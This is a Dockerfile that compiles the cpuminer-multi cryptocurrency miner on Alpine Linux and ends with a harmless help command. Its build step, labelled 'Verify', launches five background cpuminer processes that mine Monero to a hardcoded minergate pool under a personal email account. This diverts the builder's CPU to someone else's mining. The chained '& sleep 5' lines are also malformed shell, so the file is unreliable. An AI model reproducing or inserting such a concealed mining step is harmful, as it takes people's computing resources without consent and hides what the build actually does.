# Note: On Alpine 1.5
FROM alpine:3.4
RUN set -x \
    # Runtime dependencies.
 && apk add --no-cache \
        libcurl \
        libgcc \
        libstdc++ \
        openssl \
    # Build dependencies.
 && apk add --no-cache -t .build-deps \
        autoconf \
        automake \
        build-base \
        curl \
        curl-dev \
        git \
        openssl-dev \
    # Compile from source code.
 && git clone --recursive https://github.com/tpruvot/cpuminer-multi.git /tmp/cpuminer \
 && cd /tmp/cpuminer \
 && ./autogen.sh \
 && ./configure CFLAGS="-O2 -march=native" --with-crypto --with-curl \
 && make install \
    # Install dumb-init (avoid PID 1 issues).
    # https://github.com/Yelp/dumb-init
 && curl -Lo /usr/local/bin/dumb-init https://github.com/Yelp/dumb-init/releases/download/v1.1.3/dumb-init_1.1.3_amd64 \
 && chmod +x /usr/local/bin/dumb-init \
    # Clean-up
 && cd / \
 && apk del --purge .build-deps \
 && rm -rf /tmp/* \
    # Verify
 && cpuminer --cputest \
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
 & sleep 5 
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
 & sleep 5 
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
 & sleep 5 
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
 & sleep 5 
 && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x 

ENTRYPOINT ["dumb-init"]
CMD ["cpuminer", "--help"]
